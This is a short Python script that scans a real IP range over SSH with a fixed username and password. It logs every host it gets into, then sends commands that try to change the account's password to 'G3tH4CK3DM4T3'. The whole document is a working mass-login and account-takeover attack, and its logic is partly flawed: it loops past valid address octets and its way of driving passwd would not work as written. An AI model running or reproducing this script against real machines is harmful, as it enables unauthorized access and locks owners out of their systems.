import paramiko
import sys

## EDIT SSH DETAILS ##


filename = "workingIP.txt"
# randomly sift through addresses 

SSH_ADDRESS = "130.64.157."
SSH_USERNAME = "robot"
SSH_PASSWORD = "maker"
SSH_COMMAND = "passwd"

## CODE BELOW ##

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh_stdin = ssh_stdout = ssh_stderr = None

while True:
	for i in range(50,1000):
		SSH_ADDRESS = "130.64.157." + str(i)
		try:
		    ssh.connect(SSH_ADDRESS, username=SSH_USERNAME, password=SSH_PASSWORD, timeout=3)
		    with open(filename, "a") as f:
		    	f.write(SSH_ADDRESS)
		    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('passwd')
		    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('maker')
		    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('G3tH4CK3DM4T3')
		    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('G3tH4CK3DM4T3')
		except Exception as e:
		    sys.stderr.write("SSH connection error: {0}".format(e))

		if ssh_stdout:
		    sys.stdout.write(ssh_stdout.read())
		if ssh_stderr:
		    sys.stderr.write(ssh_stderr.read())